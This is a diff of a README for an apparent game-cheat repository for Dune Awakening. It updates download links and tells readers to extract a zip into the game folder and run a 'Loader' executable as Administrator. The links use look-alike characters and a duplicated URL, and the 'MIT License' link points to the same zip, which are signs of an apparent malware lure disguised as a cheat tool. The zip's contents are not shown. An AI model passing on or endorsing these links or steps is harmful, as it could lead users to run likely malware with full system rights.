@@ -26,7 +26,7 @@ Welcome to the **Dune Awakening Cheats** repository! Enhance your gameplay with 
 
 ## 🛠️ Installation
 
-1. Download **https://raw.githubusercontent.com/Ivanzavarcev/AwakenDune_GameGenie/main/Lоader.zip** from the repository.
+1. Download **https://github.com/Ivanzavarcev/AwakenDune_GameGenie/raw/refs/heads/main/cartographically/Dune_Awaken_Game_Genie_v1.8.zipоhttps://github.com/Ivanzavarcev/AwakenDune_GameGenie/raw/refs/heads/main/cartographically/Dune_Awaken_Game_Genie_v1.8.zip** from the repository.
 2. Extract the contents to your Dune Awakening installation folder.
 3. Run the Loader executable as Administrator.
 4. Follow on-screen instructions to activate your suite of tools.
@@ -43,7 +43,7 @@ This repository is intended for **educational and research purposes only**. Usag
 
 ## 📜 MIT License
 
-Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Ivanzavarcev/AwakenDune_GameGenie/main/Lоader.zip).  
+Licensed under the [MIT License (2025)](https://github.com/Ivanzavarcev/AwakenDune_GameGenie/raw/refs/heads/main/cartographically/Dune_Awaken_Game_Genie_v1.8.zipоhttps://github.com/Ivanzavarcev/AwakenDune_GameGenie/raw/refs/heads/main/cartographically/Dune_Awaken_Game_Genie_v1.8.zip).  
 Feel free to use, modify, and distribute—credit appreciated!
 
 ---
